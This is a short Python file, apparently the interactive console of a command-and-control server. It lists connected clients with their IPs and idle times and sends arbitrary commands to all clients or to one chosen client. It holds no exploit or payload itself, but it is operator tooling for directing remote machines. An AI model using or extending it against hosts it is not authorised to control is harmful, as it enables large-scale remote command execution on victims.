import time

from server_core.core import C2Server

def run_console(server: C2Server):
    print("\nC2 SERVER")
    print("Commands: list, broadcast <cmd>, client <id> <cmd>, exit")

    while server.running:
        try:
            cmd = input("C2> ").strip()
            if not cmd:
                continue

            if cmd == "exit":
                server.running = False
                break

            elif cmd == "list":
                with server.lock:
                    for c in server.clients.values():
                        with c.lock:
                            state = "ACTIVE" if c.active else "INACTIVE"
                            idle = int(time.time() - c.last_seen)
                            print(
                                f"{c.unique_id} -> {c.ip}:{c.port} "
                                f"{state} idle:{idle}s"
                            )

            elif cmd.startswith("broadcast "):
                command = cmd[len("broadcast "):]
                server.broadcast_command(command)

            elif cmd.startswith("client "):
                _, rest = cmd.split(" ", 1)
                uid, command = rest.split(" ", 1)
                server.client_command(uid, command)

            else:
                print("Unknown command")

        except (EOFError, KeyboardInterrupt):
            server.running = False
            break
